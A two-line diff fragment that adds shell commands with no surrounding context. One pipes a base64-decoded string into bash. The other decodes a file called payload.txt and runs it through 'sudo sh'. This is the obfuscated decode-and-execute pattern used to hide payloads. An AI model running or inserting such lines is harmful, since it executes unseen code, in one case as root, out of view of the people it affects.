@@ -1,0 +1,2 @@
+echo ZWNobyBoaQ== | base64 -d | bash
+base64 --decode payload.txt | sudo sh
